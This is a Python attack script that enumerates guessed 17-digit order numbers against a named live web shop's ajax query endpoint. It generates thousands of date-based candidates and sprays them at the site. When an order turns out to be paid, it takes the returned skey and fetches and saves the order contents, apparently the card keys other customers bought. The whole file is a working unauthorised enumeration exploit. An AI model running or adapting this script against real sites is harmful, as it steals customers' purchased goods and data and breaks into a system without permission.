#!/usr/bin/env python3
"""Spray 17-digit trade_no via ajax query type=1 — returns skey on paid hit"""
import os,re,json,time,subprocess,random
from pathlib import Path

BASE="https://xuxin66.top/shop"
OUT=Path(os.environ.get("OUT", f"/data/automation/results/xuxin66.top/tradeno_enum_{time.strftime('%Y%m%d_%H%M%S')}"))
OUT.mkdir(parents=True, exist_ok=True)
JAR=str(OUT/"jar.txt")
LOG=OUT/"run.log"

def log(m):
    line=f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    open(LOG,"a").write(line+"\n")

def jp(url, data=None, timeout=40):
    cmd=["jp-curl","-sS","-m",str(timeout),"-c",JAR,"-b",JAR,"-A","Mozilla/5.0"]
    if data is not None:
        cmd += ["-X","POST","-H","Content-Type: application/x-www-form-urlencoded","--data",data]
    cmd.append(url)
    r=subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+15)
    return r.stdout

def gen_candidates():
    cands=[]
    # Known unpaid format works as template
    # Peak hours over last ~9 months of operation (yxts~276 days)
    # Sample: every day at several times, several suffixes — denser recent
    days=[]
    # generate last 280 days from 2026-08-02 backwards roughly
    import datetime
    end=datetime.date(2026,8,2)
    for i in range(0,280):
        d=end-datetime.timedelta(days=i)
        days.append(d.strftime("%Y%m%d"))
    # denser for last 14 days
    hours_recent=["09","10","11","12","13","14","15","16","17","18","19","20","21","22"]
    hours_old=["10","12","14","16","18","20"]
    mins=["00","05","10","15","20","25","30","35","40","45","50","55"]
    sufs_recent=["000","001","002","010","050","100","200","300","400","500","600","700","800","880","900","999"]
    sufs_old=["001","100","500","880"]
    for i,day in enumerate(days):
        if i<14:
            hours,mins_u,sufs=hours_recent,mins,sufs_recent
            # more seconds samples
            secs=["00","10","20","30","40","50"]
        elif i<60:
            hours,mins_u,sufs=hours_old,["00","15","30","45"],sufs_old
            secs=["00","30"]
        else:
            hours,mins_u,sufs=hours_old[::2],["00","30"],["100","500"]
            secs=["00"]
        for hh in hours:
            for mm in mins_u:
                for ss in secs:
                    for suf in sufs:
                        cands.append(f"{day}{hh}{mm}{ss}{suf}")
    # shuffle but keep recent first bias: don't full shuffle, sample
    random.seed(42)
    # take all recent dense (~14d), sample older
    recent=[]; older=[]
    for c in cands:
        if c.startswith("2026072") or c.startswith("202608"):
            recent.append(c)
        else:
            older.append(c)
    random.shuffle(older)
    # cap
    older=older[:8000]
    out=list(dict.fromkeys(recent+older))
    return out

def main():
    cands=gen_candidates()
    log(f"OUT={OUT} candidates={len(cands)}")
    # warm + sanity
    jp(f"{BASE}/")
    # sanity: known unpaid should NOT be in pre_orders
    s=jp(f"{BASE}/ajax.php?act=query", data="qq=20260803075904880&type=1")
    log(f"SANITY unpaid query: {s[:200]}")
    # also getshop sanity
    g=jp(f"{BASE}/getshop.php", data="trade_no=20260803075904880")
    log(f"SANITY unpaid getshop: {g[:200]}")
    g2=jp(f"{BASE}/getshop.php", data="trade_no=19990101000000000")
    log(f"SANITY fake getshop: {g2[:200]}")

    hits=[]
    checked=0
    for tn in cands:
        checked+=1
        body=jp(f"{BASE}/ajax.php?act=query", data=f"qq={tn}&type=1")
        if checked%50==0:
            log(f"progress {checked}/{len(cands)} hits={len(hits)}")
        if not body.strip():
            continue
        if "没有查询" in body or '"data":[]' in body or '"data": []' in body:
            # empty data is miss
            if '"data":[]' in body or '"data": []' in body:
                continue
            if "没有查询" in body:
                continue
        # parse
        try:
            j=json.loads(body)
        except Exception:
            log(f"NONJSON {tn} {body[:150]}")
            continue
        data=j.get("data") or []
        if data:
            log(f"HIT {tn} n={len(data)} {body[:400]}")
            open(OUT/f"hit_{tn}.json","w").write(body)
            hits.append({"tn":tn,"body":j})
            # try order for kminfo
            for row in data:
                oid=row.get("id"); skey=row.get("skey")
                if oid and skey:
                    ob=jp(f"{BASE}/ajax.php?act=order", data=f"id={oid}&skey={skey}")
                    log(f"ORDER id={oid} -> {ob[:500]}")
                    open(OUT/f"order_{oid}.json","w").write(ob)
        elif j.get("code")==0 and not data:
            pass
        elif j.get("code")!=-1:
            log(f"ODD {tn} {body[:200]}")

    open(OUT/"hits.json","w").write(json.dumps(hits, ensure_ascii=False, indent=2))
    log(f"DONE checked={checked} hits={len(hits)}")

if __name__=="__main__":
    main()
